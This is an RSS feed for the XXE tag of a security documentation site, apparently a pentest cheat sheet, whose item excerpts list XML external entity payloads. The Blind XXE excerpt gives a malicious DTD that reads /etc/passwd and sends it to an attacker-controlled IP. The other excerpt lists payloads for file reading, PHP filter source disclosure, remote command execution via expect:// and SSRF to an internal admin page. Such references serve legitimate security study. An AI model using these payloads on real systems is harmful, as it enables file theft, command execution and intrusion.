@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>XXE on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/xxe/</link>
+    <description>Recent content in XXE on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sat, 10 Jun 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/xxe/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Blind XXE</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</link>
+      <pubDate>Sat, 10 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</guid>
+      <description>Data Exfiltration via Out-Of-Band link1. Create a Malicious DTD linkWe need to prepare the dtd file (named &amp;ldquo;exploit.dtd&amp;rdquo; here) to retrieve the target file.&#xA;Replace the ip address with your own.&#xA;&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; &amp;lt;!-- &amp;lt;!ENTITY % file SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=index.php&amp;#34; --&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfiltrate SYSTEM &amp;#39;http://10.0.0.1/?x=%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt; %eval; %exfiltrate; Then host it on web server.&#xA;sudo python3 -m http.server 80 2. Insert XXE linkIn http request body, insert the following XXE payload.</description>
+    </item>
+    <item>
+      <title>XXE (XML External Entity)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</link>
+      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</guid>
+      <description>Read Files link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E PHP Filter link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; Remote Code Execution link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;expect://whoami&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E SSRF attack link &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://sub.vulnerable.com/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; Also we can use the Blind XXE for exfiltrating data.</description>
+    </item>
+  </channel>
+</rss>
